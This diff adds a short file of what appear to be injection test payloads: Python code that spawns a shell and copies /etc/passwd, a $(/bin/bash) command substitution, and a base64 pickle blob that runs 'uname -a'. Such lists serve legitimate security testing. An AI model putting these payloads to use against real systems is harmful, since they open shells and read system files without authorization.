@@ -1,0 +1,4 @@
+﻿__import__('os').system('sh')
+__import__('shutil').copyfile('/etc/passwd','/tmp/passwd')
+$(/bin/bash)
+Y250CnN5c3RlbQpwMQooUyd1bmFtZSAtYScKcDIKdFJwMwou
